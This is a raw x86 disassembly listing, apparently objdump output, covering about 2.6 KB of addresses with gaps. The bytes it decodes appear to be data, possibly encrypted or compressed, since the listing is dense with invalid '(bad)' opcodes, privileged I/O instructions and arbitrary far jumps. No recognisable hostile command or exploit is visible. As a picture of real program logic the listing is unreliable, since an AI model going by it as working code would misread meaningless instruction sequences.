  4202d1:	pop    ds
  4202d2:	fdiv   DWORD PTR [eax-0x7f]
  4202d5:	and    eax,0x1bf3ea21
  4202da:	aaa    
  4202db:	adc    DWORD PTR [edx],ebx
  4202dd:	pop    edx
  4202de:	and    BYTE PTR [esi-0x32e208dd],dh
  4202e4:	fisttp WORD PTR [ecx-0x16]
  4202e7:	mov    ch,BYTE PTR [edx-0x6d]
  4202ea:	cwde   
  4202eb:	ja     0x420306
  4202ed:	push   esp
  4202ee:	out    0x8,eax
  4202f0:	sbb    ecx,DWORD PTR [ebx]
  4202f2:	and    edi,DWORD PTR [ecx+0x23]
  4202f5:	lea    edi,[ebx-0x14fe67bc]
  4202fb:	xchg   edi,eax
  4202fc:	add    ah,al
  4202fe:	test   BYTE PTR [edi],dl
  420300:	cmp    BYTE PTR [esi-0x61c3263f],bl
  420306:	cwde   
  420307:	adc    DWORD PTR [esi+ecx*1+0x2],ebx
  42030b:	lea    ebx,[ebp+ebx*2+0x392c63f]
  420312:	sub    edi,DWORD PTR [edi-0x7e]
  420315:	or     DWORD PTR [ecx+0x5f],edx
  420318:	into   
  420319:	and    DWORD PTR [bp+di+0x6d81],esp
  42031e:	dec    esp
  42031f:	shl    DWORD PTR [edi],cl
  420321:	pop    ds
  420322:	popf   
  420323:	sbb    DWORD PTR [eax+ebp*1-0x29],esi
  420327:	mov    BYTE PTR [ecx+0x3e],dl
  42032a:	cmp    al,0xc2
  42032c:	xchg   DWORD PTR [ecx-0x283b20f2],eax
  420332:	enter  0xfd7f,0x59
  420336:	sub    bh,bh
  420338:	pop    esi
  420339:	clc    
  42033a:	xchg   ebp,eax
  42033b:	mov    ebx,0x3675e6fd
  420340:	and    DWORD PTR [eax],ebx
  420342:	imul   ebp,DWORD PTR [edx],0xffffffb5
  420345:	pop    es
  420346:	(bad)  
  420347:	icebp  
  420348:	add    edi,0xb5f8e359
  42034e:	sub    eax,DWORD PTR [ebx+0x2]
  420351:	js     0x42033d
  420353:	adc    eax,0x1b41eb4b
  420358:	fisubr DWORD PTR [eax-0x39100380]
  42035e:	scas   al,BYTE PTR es:[edi]
  42035f:	shl    BYTE PTR [edx],0x8a
  420362:	mov    bl,0x3e
  420364:	fs pop ss
  420366:	xor    DWORD PTR [ebp-0xf],0xeba4cb50
  42036d:	xchg   edi,eax
	...
  4203d6:	inc    ecx
  4203d7:	push   es
  4203d8:	clc    
  4203d9:	mov    esi,0xff47feff
  4203de:	and    BYTE PTR [eax+0x2a],bh
  4203e1:	hlt    
  4203e2:	mov    esp,0x676eb619
  4203e7:	pop    edx
  4203e8:	add    DWORD PTR [eax],eax
  4203ea:	add    BYTE PTR [ecx],al
  4203ec:	add    BYTE PTR [eax],al
  4203ee:	pushf  
  4203ef:	pop    edi
  4203f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203f1:	jp     0x4203fc
  4203f3:	xchg   DWORD PTR [edx],edi
  4203f5:	shl    BYTE PTR [eax+0x55],1
  4203f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203f9:	xor    eax,0x1e28758d
  4203fe:	mov    bl,0xdc
  420400:	xor    al,0x99
  420402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420403:	and    dh,dh
  420405:	push   0x1ed6fe29
  42040a:	jmp    0x420406
  42040c:	xchg   edx,eax
  42040d:	scas   al,BYTE PTR es:[di]
  42040f:	add    eax,0x5ff3db44
  420414:	xor    al,0x6d
  420416:	mov    eax,ds:0x19b0f058
  42041b:	sbb    eax,0xad7dc673
  420420:	mov    cl,0x29
  420422:	pop    ss
  420423:	rdpmc  
  420425:	ins    BYTE PTR es:[edi],dx
  420426:	test   ch,ah
  420428:	or     al,0xb9
  42042a:	lea    ebx,[edi]
  42042c:	pop    esp
  42042d:	je     0x42047f
  42042f:	sub    BYTE PTR [edi+0x6f],ah
  420432:	and    al,0xe6
  420434:	out    0x6f,eax
  420436:	mov    esp,0xeeb2635c
  42043b:	cmp    al,BYTE PTR [edx]
  42043d:	in     al,0x73
  42043f:	add    DWORD PTR [ecx+edx*4-0x696e375e],eax
  420446:	jne    0x42040e
  420448:	retf   
  420449:	pop    esp
  42044a:	adc    eax,0xcd3c5e0e
  42044f:	sub    al,0x97
  420451:	dec    ecx
  420452:	ret    0x18fa
  420455:	push   es
  420456:	and    bl,BYTE PTR [ecx]
  420458:	cmp    esp,DWORD PTR [eax-0x5f]
  42045b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42045c:	stos   DWORD PTR es:[edi],eax
  42045d:	xchg   esi,eax
  42045e:	test   eax,0x85e25611
  420463:	daa    
  420464:	inc    ebp
  420465:	sbb    bh,ch
  420467:	test   ebp,ebp
  420469:	hlt    
  42046a:	lods   al,BYTE PTR ds:[esi]
  42046b:	pop    ds
  42046c:	push   0x11588783
  420471:	adc    DWORD PTR [esi],eax
  420473:	and    DWORD PTR [ebx+ebx*1+0x14],0x1b
  420478:	das    
  420479:	in     eax,0xfe
  42047b:	or     eax,0xec18f9c4
  420480:	inc    edx
  420481:	inc    edi
  420482:	and    eax,esp
  420484:	ret    
  420485:	rcr    ah,0x77
  420488:	loope  0x420435
  42048a:	push   ebx
  42048b:	scas   eax,DWORD PTR es:[edi]
  42048c:	jmp    0xcc4b:0x59267a61
  420493:	sbb    ch,BYTE PTR [ebp-0x80]
  420496:	les    esp,FWORD PTR [ecx]
  420498:	(bad)  
  42049a:	and    dl,ch
  42049c:	in     eax,0x79
  42049e:	adc    al,0x71
  4204a0:	adc    eax,DWORD PTR [ebx]
  4204a2:	cmp    DWORD PTR [edi-0x73ddc0f4],esi
  4204a8:	es (bad) 
  4204aa:	in     al,dx
  4204ab:	jbe    0x420508
  4204ad:	pop    ss
  4204ae:	(bad)  
  4204af:	pop    ebx
  4204b0:	das    
  4204b1:	cwde   
  4204b2:	int3   
  4204b3:	je     0x420470
  4204b5:	mov    eax,0x3449631
  4204ba:	jp     0x42047d
  4204bc:	outs   dx,BYTE PTR ds:[esi]
  4204bd:	inc    DWORD PTR [ebx]
  4204bf:	xchg   esi,eax
  4204c0:	in     eax,dx
  4204c1:	icebp  
  4204c2:	cmp    bh,BYTE PTR [ebx+edx*2-0x548dbe13]
  4204c9:	sbb    al,0x49
  4204cb:	ja     0x420530
  4204cd:	sbb    eax,ebx
  4204cf:	sti    
  4204d0:	xor    DWORD PTR [esi-0x529f0250],ebp
  4204d6:	clc    
  4204d7:	xchg   BYTE PTR [eax],ch
  4204d9:	xor    al,BYTE PTR [eax+0x43]
  4204dc:	iret   
  4204dd:	imul   eax,DWORD PTR [edx+0x67],0xffffffd2
  4204e1:	popa   
  4204e2:	daa    
  4204e3:	xor    ecx,DWORD PTR [edi+0x6362f540]
  4204e9:	(bad)  [esi]
  4204eb:	mov    eax,0x94df
	...
  420554:	add    BYTE PTR [eax],al
  420556:	scas   al,BYTE PTR es:[edi]
  420557:	xchg   esp,eax
  420558:	push   edi
  420559:	adc    bh,BYTE PTR [edi-0x2d]
  42055c:	out    dx,eax
  42055d:	mov    esp,0x5a7f6c39
  420562:	pop    esi
  420563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420564:	loop   0x42056d
  420566:	addr16 pop ebx
  420568:	add    DWORD PTR [eax],eax
  42056a:	add    BYTE PTR [ecx],al
  42056c:	add    BYTE PTR [eax],al
  42056e:	add    al,0x13
  420570:	loop   0x420547
  420572:	lea    ecx,[edi+0x77]
  420575:	push   0xffffffbe
  420577:	or     ebx,esp
  420579:	aam    0x4a
  42057b:	add    BYTE PTR [ebp+0x5bf27b9f],ah
  420581:	inc    edx
  420582:	xor    cl,BYTE PTR [esi+0x45]
  420585:	cli    
  420586:	or     BYTE PTR [ecx],bh
  420588:	scas   al,BYTE PTR es:[edi]
  420589:	mov    ah,0xa6
  42058b:	and    BYTE PTR [edi+0x4843983e],0xf
  420592:	push   esp
  420593:	ds jl  0x4205e9
  420596:	inc    edx
  420597:	mov    WORD PTR [esi-0x64],es
  42059a:	repz sub BYTE PTR [ecx+0x46695647],cl
  4205a1:	test   DWORD PTR [ebx+0x1bf0f43],0x1bb435af
  4205ab:	pop    eax
  4205ac:	imul   esp
  4205ae:	and    BYTE PTR [esi-0x6f9db7e5],0x1f
  4205b5:	rol    DWORD PTR [ecx],1
  4205b7:	arpl   WORD PTR [edi-0x21],cx
  4205ba:	push   ss
  4205bb:	out    dx,eax
  4205bc:	retf   0xf2a4
  4205bf:	pop    esi
  4205c0:	add    eax,0x6fa0571c
  4205c5:	fsub   DWORD PTR [ecx]
  4205c7:	gs push eax
  4205c9:	jmp    0xda22b464
  4205ce:	mov    al,ds:0x24b559dd
  4205d3:	das    
  4205d4:	add    DWORD PTR [edx+ebp*8+0x46],esp
  4205d8:	lds    esi,FWORD PTR [esi]
  4205da:	jno    0x4205f0
  4205dc:	out    dx,al
  4205dd:	cs jae 0x420638
  4205e0:	icebp  
  4205e1:	loop   0x420593
  4205e3:	mov    ebp,0x4b486a5f
  4205e8:	ficom  WORD PTR [ecx+0x46e9289e]
  4205ee:	js     0x420650
  4205f0:	inc    edx
  4205f1:	mov    esp,0x596afad2
  4205f6:	inc    ebx
  4205f7:	add    eax,0x8b3af32e
  4205fc:	xchg   DWORD PTR [edx-0x7c],ebp
  4205ff:	dec    edx
  420600:	das    
  420601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420602:	cdq    
  420603:	arpl   WORD PTR [ecx-0x18833e14],bp
  420609:	stos   DWORD PTR es:[edi],eax
  42060a:	je     0x420675
  42060c:	ss imul ebp,eax,0xc0e62b55
  420613:	xchg   ebp,eax
  420614:	fdiv   QWORD PTR [esi]
  420616:	mov    WORD PTR [eax+0x2964d717],cs
  42061c:	ret    
  42061d:	and    DWORD PTR [ebx+0x3a1e6fa],ecx
  420623:	sti    
  420624:	xor    dl,ch
  420626:	xor    al,0x32
  420628:	lods   al,BYTE PTR ds:[esi]
  420629:	cmc    
  42062a:	pushf  
  42062b:	call   0xa4531aaf
  420630:	xor    BYTE PTR [ebx+0x4dda0bdd],bh
  420636:	ja     0x420670
  420638:	inc    esp
  420639:	pop    ds
  42063a:	mov    edx,0x42c72fc8
  42063f:	push   esi
  420640:	sbb    DWORD PTR [eax],ebx
  420642:	mov    esp,0x66e68ca6
  420647:	dec    esi
  420648:	test   eax,0x40c4b964
  42064d:	pusha  
  42064e:	push   ecx
  42064f:	es cli 
  420651:	cmp    cl,bl
  420653:	push   0xfffffff4
  420655:	dec    BYTE PTR [esi]
  420657:	int    0xf9
  420659:	sti    
  42065a:	call   0xdaba6c35
  42065f:	adc    BYTE PTR [esi],ch
  420661:	icebp  
  420662:	fwait
  420663:	pop    ebp
  420664:	xchg   esi,eax
  420665:	data16 (bad) 
  420667:	fsub   st,st(0)
  420669:	faddp  st(1),st
  42066b:	mov    DWORD PTR [ebx],0xa8
	...
  4206d5:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  4206dc:	mov    ah,0xec
  4206de:	lds    eax,FWORD PTR [eax]
  4206e0:	aad    0x78
  4206e2:	stc    
  4206e3:	(bad)  
  4206e4:	pop    ss
  4206e5:	fbld   TBYTE PTR [edi+0x5c]
  4206e8:	add    DWORD PTR [eax],eax
  4206ea:	add    BYTE PTR [ecx],al
  4206ec:	add    BYTE PTR [eax],al
  4206ee:	jns    0x420712
  4206f0:	pop    ebx
  4206f1:	pop    edx
  4206f2:	mov    edx,0x15e71438
  4206f7:	sbb    al,0x5b
  4206f9:	sti    
  4206fa:	mov    esi,0xbbef1b70
  4206ff:	mov    esi,0xfd098d72
  420704:	je     0x420774
  420706:	xor    eax,0x629bfe9e
  42070b:	cmp    DWORD PTR [esi+0x56f47d74],eax
  420711:	data16 int3 
  420713:	mov    eax,ds:0x59e46049
  420718:	or     DWORD PTR [edi-0x36],esi
  42071b:	adc    DWORD PTR [edx-0xc],ecx
  42071e:	(bad)  
  42071f:	push   edi
  420720:	mov    esp,0x9cd4f4d6
  420725:	inc    esp
  420726:	ins    BYTE PTR es:[edi],dx
  420727:	cmp    edx,ecx
  420729:	mov    ?,WORD PTR [eax-0x5b8bab77]
  42072f:	dec    edx
  420730:	fimul  DWORD PTR [ecx+esi*1-0x64]
  420734:	out    0xd7,al
  420736:	rol    BYTE PTR [eax],0xc4
  420739:	stos   BYTE PTR es:[edi],al
  42073a:	dec    ebx
  42073b:	adc    BYTE PTR [esi+0x2beeb516],bl
  420741:	into   
  420742:	inc    esi
  420743:	and    al,0x5c
  420745:	fwait
  420746:	sti    
  420747:	mov    edi,0x2667649f
  42074c:	xchg   ebp,eax
  42074d:	mov    ch,0xa
  42074f:	test   dl,cl
  420751:	fwait
  420752:	(bad)  
  420753:	jmp    0x4563:0xf73215f3
  42075a:	or     eax,0xdaf49cb0
  42075f:	or     BYTE PTR [edx],0x29
  420762:	inc    edi
  420763:	not    bh
  420765:	fstp   QWORD PTR [edi+0x27]
  420768:	lahf   
  420769:	xor    dl,BYTE PTR [edi+eiz*1+0x5]
  42076d:	stos   BYTE PTR es:[edi],al
  42076e:	aam    0x53
  420770:	test   al,0x7
  420772:	or     BYTE PTR [ecx-0x12],cl
  420775:	xchg   esi,eax
  420776:	and    DWORD PTR [ebx-0x5a304dd9],ebx
  42077c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42077d:	lods   al,BYTE PTR ds:[esi]
  42077e:	push   ss
  42077f:	adc    esp,edi
  420781:	jbe    0x4207f1
  420783:	mov    esi,0xa538448d
  420788:	cmp    al,0x5d
  42078a:	jg     0x4207c2
  42078c:	dec    eax
  42078d:	add    eax,0xf0f2d57a
  420792:	lahf   
  420793:	out    dx,al
  420794:	lea    ebp,[ebx]
  420796:	mov    bh,0x14
  420798:	jae    0x420760
  42079a:	int3   
  42079b:	adc    edi,ebx
  42079d:	cld    
  42079e:	jno    0x4207ea
  4207a0:	(bad)  
  4207a1:	scas   al,BYTE PTR es:[edi]
  4207a2:	cbw    
  4207a4:	and    DWORD PTR [ecx-0x12daabfc],ebp
  4207aa:	adc    bh,BYTE PTR [esi+0x3e]
  4207ad:	mov    ecx,0x9c96d193
  4207b2:	jge    0x42081f
  4207b4:	ret    
  4207b5:	mov    dh,0x4a
  4207b7:	ret    0x5579
  4207ba:	jnp    0x4207e4
  4207bc:	repz jecxz 0x4207bf
  4207bf:	xchg   ebx,eax
  4207c0:	mov    esp,0x41168858
  4207c5:	or     DWORD PTR [edi-0x3b],edi
  4207c8:	adc    al,0xb8
  4207ca:	add    eax,0xb760ea
  4207cf:	pop    ebx
  4207d0:	and    DWORD PTR [ebp-0x1e8021a4],esi
  4207d6:	mov    ecx,0x9a4d05cd
  4207db:	pop    es
  4207dc:	retf   
  4207dd:	call   DWORD PTR [ecx+0x284035c0]
  4207e3:	sar    DWORD PTR [esi-0x959e04e],1
  4207e9:	xchg   edx,eax
  4207ea:	jno    0x42085c
  4207ec:	cmp    dh,BYTE PTR [edi+0x0]
	...
  420853:	add    BYTE PTR [eax],al
  420855:	add    BYTE PTR [ecx-0x587fdad1],cl
  42085b:	mov    ch,BYTE PTR [ebp-0x2390c6d1]
  420861:	pusha  
  420862:	sbb    eax,0x674b5c93
  420867:	pop    ebp
  420868:	add    DWORD PTR [eax],eax
  42086a:	add    BYTE PTR [ecx],al
  42086c:	add    BYTE PTR [eax],al
  42086e:	shl    DWORD PTR [ebp+0x4e],0x89
  420872:	pop    ss
  420873:	or     al,BYTE PTR ds:0xda600b9f
  420879:	aas    
  42087a:	push   eax
  42087b:	xor    al,0x1c
  42087d:	stos   BYTE PTR es:[edi],al
  42087e:	out    dx,eax
  42087f:	scas   eax,DWORD PTR es:[edi]
  420880:	popf   
  420881:	pop    eax
  420882:	sti    
  420883:	add    eax,0x15f2c627
  420888:	inc    esp
  420889:	pop    eax
  42088a:	ret    
  42088b:	scas   eax,DWORD PTR es:[edi]
  42088c:	or     al,0x2d
  42088e:	jnp    0x4208c1
  420890:	(bad)  
  420891:	retf   0x56c4
  420894:	in     eax,0xbd
  420896:	inc    ebx
  420897:	dec    esi
  420898:	sbb    al,0x54
  42089a:	popa   
  42089b:	in     eax,0xff
  42089d:	test   ebx,edi
  42089f:	lahf   
  4208a0:	(bad)  
  4208a1:	in     al,0x9
  4208a3:	mov    ebx,DWORD PTR [edx]
  4208a5:	sar    DWORD PTR [ecx+0x63150865],cl
  4208ab:	adc    al,BYTE PTR [esi+0x6bf060fc]
  4208b1:	int3   
  4208b2:	mov    edi,0xc7504052
  4208b7:	sub    bh,BYTE PTR [ebp+0x5ddd9cbd]
  4208bd:	rcr    DWORD PTR [eax+0x25a8b829],0xfb
  4208c4:	cmp    eax,0x8c7dfb55
  4208c9:	jle    0x42090b
  4208cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208cc:	sahf   
  4208cd:	or     al,0x9c
  4208cf:	fs push ebp
  4208d1:	xor    BYTE PTR [ecx-0x57],ch
  4208d4:	mov    dh,0x6
  4208d6:	loopne 0x4208e9
  4208d8:	cwde   
  4208d9:	jbe    0x420872
  4208db:	cmp    dl,BYTE PTR [edx-0x33397fdc]
  4208e1:	mov    DWORD PTR [esi-0x4d],eax
  4208e4:	call   DWORD PTR [ecx+0x16]
  4208e7:	xor    ecx,DWORD PTR [eax+0x20]
  4208ea:	sbb    dl,BYTE PTR [esi-0x715d9e83]
  4208f0:	and    BYTE PTR [ebx],bh
  4208f2:	adc    eax,0xd33612df
  4208f7:	aam    0xae
  4208f9:	in     al,0x41
  4208fb:	aas    
  4208fc:	fnsave [ecx]
  4208fe:	fnstenv [ebx]
  420900:	add    BYTE PTR [esi-0x791fd6f2],bl
  420906:	adc    esp,DWORD PTR [edi+ebx*8+0x13]
  42090a:	inc    esi
  42090b:	mov    ebx,0x820bdaf6
  420910:	rol    DWORD PTR [ebp+0x2ce27d5b],0x3f
  420917:	xor    al,0xed
  420919:	mov    al,ds:0xd661a750
  42091e:	xchg   esi,eax
  42091f:	mov    ah,0x90
  420921:	int3   
  420922:	imul   eax,DWORD PTR [ecx+ebp*4-0x79a69307],0xf29f7918
  42092d:	xchg   BYTE PTR [esi],bh
  42092f:	rcl    BYTE PTR [eax-0x1982c6d],cl
  420935:	fscale 
  420937:	inc    edi
  420938:	es iret 
  42093a:	dec    ebp
  42093b:	jge    0x4208f5
  42093d:	sbb    BYTE PTR [ebx+edx*2],bl
  420940:	dec    esp
  420941:	or     eax,0x212f334c
  420946:	nop
  420947:	pop    edi
  420948:	mov    dh,0x51
  42094a:	add    esp,esi
  42094c:	ret    0x48ac
  42094f:	push   es
  420950:	clc    
  420951:	sub    al,0x90
  420953:	and    DWORD PTR [esi],esp
  420955:	aam    0xa2
  420957:	push   es
  420958:	sub    al,0x51
  42095a:	mov    esp,0x497c6a02
  42095f:	add    cl,BYTE PTR ds:0x4ca93954
  420965:	iret   
  420966:	jg     0x4209c1
  420968:	cmp    ecx,DWORD PTR [edx]
  42096a:	mov    bl,0xa9
  42096c:	pop    esi
  42096d:	inc    esi
	...
  4209d6:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  4209dd:	mov    ch,0xd2
  4209df:	ja     0x420a3f
  4209e1:	mov    dh,0x8c
  4209e3:	or     ebx,DWORD PTR ss:[ecx]
  4209e6:	addr16 pop esi
  4209e8:	add    DWORD PTR [eax],eax
  4209ea:	add    BYTE PTR [ecx],al
  4209ec:	add    BYTE PTR [eax],al
  4209ee:	and    al,0x60
  4209f0:	mov    al,ds:0xc8fb116f
  4209f5:	add    ah,BYTE PTR ds:0xc49c37
  4209fb:	stc    
  4209fc:	inc    eax
  4209fd:	mov    al,0x66
  4209ff:	push   ebp
  420a00:	jae    0x4209a7
  420a02:	mov    cl,0xe4
  420a04:	mov    ch,BYTE PTR [ebp+0x66b349]
  420a0a:	data16 into 
  420a0c:	test   eax,0xf070523
  420a11:	dec    ecx
  420a12:	jl     0x4209fb
  420a14:	add    eax,eax
  420a16:	jl     0x420999
  420a18:	sub    dl,bl
  420a1a:	or     BYTE PTR [ebp-0x4e72fd3f],cl
  420a20:	or     al,0x97
  420a22:	jbe    0x420a24
  420a24:	xchg   esp,eax
  420a25:	call   0x9dbd:0xd3ca9d1b
  420a2c:	mov    cl,bh
  420a2e:	ficom  WORD PTR [eax+0x70d8b884]
  420a34:	jge    0x4209c8
  420a36:	loope  0x4209fb
  420a38:	aas    
  420a39:	ins    DWORD PTR es:[edi],dx
  420a3a:	pop    ebp
  420a3b:	aas    
  420a3c:	add    ebp,DWORD PTR [esi]
  420a3e:	(bad)  
  420a3f:	pop    ebx
  420a40:	xchg   ecx,eax
  420a41:	jae    0x420a81
  420a43:	inc    ecx
  420a44:	pop    ecx
  420a45:	sahf   
  420a46:	leave  
  420a47:	neg    DWORD PTR [ecx-0x2a8b710f]
  420a4d:	mov    ?,WORD PTR [esi-0x7b]
  420a50:	lods   eax,DWORD PTR ds:[esi]
  420a51:	movlps xmm7,QWORD PTR ds:0xedec6998
  420a58:	adc    al,0x7f
  420a5a:	outs   dx,BYTE PTR ds:[esi]
  420a5b:	jnp    0x420ac5
  420a5d:	iret   
  420a5e:	cmp    edi,ebp
  420a60:	out    dx,al
  420a61:	loope  0x4209f1
  420a63:	xchg   edx,eax
  420a64:	sbb    BYTE PTR [esi+ebp*1-0x3588a25a],bl
  420a6b:	arpl   WORD PTR [eax+0xb],dx
  420a6e:	adc    DWORD PTR [ebp+ebx*1-0x2030605a],ebx
  420a75:	xchg   BYTE PTR [ebp-0x46],dl
  420a78:	(bad)  
  420a79:	xlat   BYTE PTR ds:[ebx]
  420a7a:	mov    fs,WORD PTR [esi-0x76]
  420a7d:	or     DWORD PTR [esi+edx*8],ecx
  420a80:	cmp    eax,DWORD PTR [edi]
  420a82:	sahf   
  420a83:	ins    DWORD PTR es:[edi],dx
  420a84:	aam    0x27
  420a86:	push   esp
  420a87:	clc    
  420a88:	lea    edx,[edx+0x1b00ad0b]
  420a8e:	dec    edx
  420a8f:	(bad)  
  420a90:	xor    BYTE PTR [esi-0x4956aa8f],al
  420a96:	sub    ah,BYTE PTR [ebx+0x72]
  420a99:	in     al,dx
  420a9a:	push   0xffffff8b
  420a9c:	mov    bh,BYTE PTR ds:0x29aea4f5
  420aa2:	imul   edx,DWORD PTR [ecx-0x6],0x35a9842d
  420aa9:	mov    edi,0xe7f69aac
  420aae:	or     DWORD PTR [ebx-0x2b85e924],0xe255dd9e
  420ab8:	push   0xffffffd7
  420aba:	aas    
  420abb:	pop    ebp
  420abc:	retf   0xc331
  420abf:	jne    0x420a93
  420ac1:	mov    eax,eax
  420ac3:	(bad)  [edi-0x12]
  420ac6:	and    BYTE PTR [eax+0x7fb0c609],ah
  420acc:	pop    ss
  420acd:	out    dx,al
  420ace:	test   edi,eax
  420ad0:	ja     0x420b41
  420ad2:	push   ecx
  420ad3:	mov    ebp,DWORD PTR [edi+eiz*1]
  420ad6:	(bad)  
  420ad7:	adc    al,0xb
  420ad9:	adc    cl,BYTE PTR [edx+eax*1+0x166ba563]
  420ae0:	dec    ebp
  420ae1:	daa    
  420ae2:	call   0xc3bcd8a9
  420ae7:	jmp    0x420a72
  420ae9:	in     eax,0x87
  420aeb:	xchg   esi,eax
  420aec:	mov    ds:0xd3,al
	...
  420b55:	add    bh,bl
  420b57:	xor    ch,BYTE PTR [edi-0x6010ed]
  420b5d:	(bad)  
  420b5e:	xlat   BYTE PTR ds:[ebx]
  420b5f:	out    dx,eax
  420b60:	(bad)  
  420b61:	cld    
  420b62:	jle    0x420b88
  420b64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b65:	jl     0x420bce
  420b67:	pop    edi
  420b68:	add    DWORD PTR [eax],eax
  420b6a:	add    BYTE PTR [ecx],al
  420b6c:	add    BYTE PTR [eax],al
  420b6e:	int    0x8f
  420b70:	fsub   DWORD PTR [ebx-0x69a84dd4]
  420b76:	stc    
  420b77:	in     al,dx
  420b78:	dec    esi
  420b79:	leave  
  420b7a:	int    0x7f
  420b7c:	mul    DWORD PTR [edi+0x6a]
  420b7f:	pop    ebp
  420b80:	jbe    0x420bbc
  420b82:	adc    bl,cl
  420b84:	xchg   ebx,eax
  420b85:	test   eax,0xf414ffba
  420b8a:	push   eax
  420b8b:	sub    bh,BYTE PTR [edx+0x8]
  420b8e:	mov    DWORD PTR [edx],ebx
  420b90:	xchg   esi,eax
  420b91:	ss sbb al,0x59
  420b94:	pop    edx
  420b95:	dec    ebx
  420b96:	aaa    
  420b97:	or     eax,0xf7bed7c7
  420b9c:	adc    al,cl
  420b9e:	dec    ebx
  420b9f:	into   
  420ba0:	mov    edi,DWORD PTR [edi]
  420ba2:	or     edx,edi
  420ba4:	pop    ecx
  420ba5:	fdiv   DWORD PTR [eax]
  420ba7:	sbb    eax,0x8e101fc3
  420bac:	xor    DWORD PTR [edx-0x45],esp
  420baf:	and    DWORD PTR ds:0x8e165758,0x963583
  420bb9:	or     cl,dh
  420bbb:	pop    eax
  420bbc:	dec    esp
  420bbd:	xchg   edi,eax
  420bbe:	xchg   ecx,eax
  420bbf:	mov    edi,0xf2b0146c
  420bc4:	mov    ebp,0x119002a1
  420bc9:	not    BYTE PTR [ecx+0x7cf64068]
  420bcf:	retf   0x2f94
  420bd2:	dec    ebx
  420bd3:	out    0x10,al
  420bd5:	jo     0x420c01
  420bd7:	test   eax,0xd7a8f60f
  420bdc:	jp     0x420b9d
  420bde:	pop    eax
  420bdf:	pop    esi
  420be0:	xchg   edx,eax
  420be1:	push   esp
  420be2:	jmp    DWORD PTR cs:[ecx-0x38]
  420be6:	adc    ebp,DWORD PTR [ecx-0x4738f381]
  420bec:	cmp    DWORD PTR [ecx],ebp
  420bee:	lods   eax,DWORD PTR ds:[esi]
  420bef:	adc    al,0xaa
  420bf1:	push   edi
  420bf2:	das    
  420bf3:	loopne 0x420ba8
  420bf5:	xchg   esi,eax
  420bf6:	add    ecx,DWORD PTR [ebp-0x47]
  420bf9:	(bad)  
  420bfa:	xchg   ebx,eax
  420bfb:	pusha  
  420bfc:	mov    BYTE PTR [esi-0xf],bh
  420bff:	or     ebx,DWORD PTR [ecx]
  420c01:	test   eax,0x7a4dc5f5
  420c06:	mov    al,BYTE PTR [ebx+0x4e]
  420c09:	inc    edi
  420c0a:	push   esi
  420c0b:	leave  
  420c0c:	mov    bh,0xca
  420c0e:	(bad)  
  420c0f:	loopne 0x420c19
  420c11:	repnz inc DWORD PTR [edi+0x6f]
  420c15:	add    al,0x94
  420c17:	push   edi
  420c18:	jge    0x420bf3
  420c1a:	cmp    al,0xca
  420c1c:	inc    edi
  420c1d:	shl    BYTE PTR [eax+edx*1],cl
  420c20:	adc    bh,BYTE PTR [edx-0x6b134463]
  420c26:	xor    BYTE PTR [edx+edx*1],ch
  420c29:	les    ecx,FWORD PTR [ebx]
  420c2b:	ss inc ebx
  420c2d:	push   eax
  420c2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c2f:	push   esp
  420c30:	pusha  
  420c31:	fwait
  420c32:	shl    ebp,0xfe
  420c35:	or     BYTE PTR [edi+eax*1-0x3b],ch
  420c39:	or     ebx,DWORD PTR [esi]
  420c3b:	inc    ebx
  420c3c:	cmp    bl,al
  420c3e:	push   esi
  420c3f:	aad    0x70
  420c41:	jle    0x420c14
  420c43:	call   0x13c:0xb3941e8a
  420c4a:	je     0x420c60
  420c4c:	rcl    BYTE PTR [eax-0x2f],cl
  420c4f:	ret    0xb210
  420c52:	sub    BYTE PTR [esi-0x46],dh
  420c55:	jnp    0x420c5d
  420c57:	xlat   BYTE PTR ds:[ebx]
  420c58:	xchg   esi,eax
  420c59:	pop    esp
  420c5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c5b:	inc    ebp
  420c5c:	push   ecx
  420c5d:	call   DWORD PTR [ecx]
  420c5f:	test   BYTE PTR [ebx],0x35
  420c62:	xchg   ebp,eax
  420c63:	jb     0x420c38
  420c65:	aaa    
  420c66:	int    0xcf
  420c68:	dec    DWORD PTR [ebp-0xafb422f]
	...
  420cd6:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420cdc:	mov    edx,0x1886e3f
  420ce1:	in     eax,0xd8
  420ce3:	add    eax,0x6067d9aa
  420ce8:	add    DWORD PTR [eax],eax
  420cea:	add    BYTE PTR [ecx],al
  420cec:	add    BYTE PTR [eax],al
  420cee:	lahf   
  420cef:	aas    
  420cf0:	lods   eax,DWORD PTR ds:[esi]
  420cf1:	xor    ebp,DWORD PTR [ebp+0x65]
  420cf4:	fdivr  DWORD PTR [eax-0x1a48984d]
  420cfa:	mov    ds:0x3609c140,eax
  420cff:	out    0x3b,al
  420d01:	shl    BYTE PTR [ebx-0x57],0x14
  420d05:	or     ebx,DWORD PTR [esi+ebx*1]
  420d08:	sub    ebp,0x41b3eaee
  420d0e:	(bad)  
  420d0f:	xlat   BYTE PTR ds:[ebx]
  420d10:	jg     0x420d4b
  420d12:	mov    ah,0xc8
  420d14:	in     al,0x4c
  420d16:	push   edx
  420d17:	adc    DWORD PTR [edx-0x3f549201],ecx
  420d1d:	inc    edx
  420d1e:	rol    DWORD PTR [ebx],1
  420d20:	push   esi
  420d21:	and    DWORD PTR [edx+edi*8+0x6b],eax
  420d25:	rcl    DWORD PTR [ecx-0x1c6d5415],1
  420d2b:	out    dx,al
  420d2c:	addr16 ret 0x329d
  420d30:	ins    BYTE PTR es:[edi],dx
  420d31:	fnstcw WORD PTR [edx]
  420d33:	cmp    cl,cl
  420d35:	mov    eax,0x99985346
  420d3a:	cli    
  420d3b:	ds mov ebp,0xa4806d06
  420d41:	mov    DWORD PTR [eax-0x3ec314f3],0xc97d48b
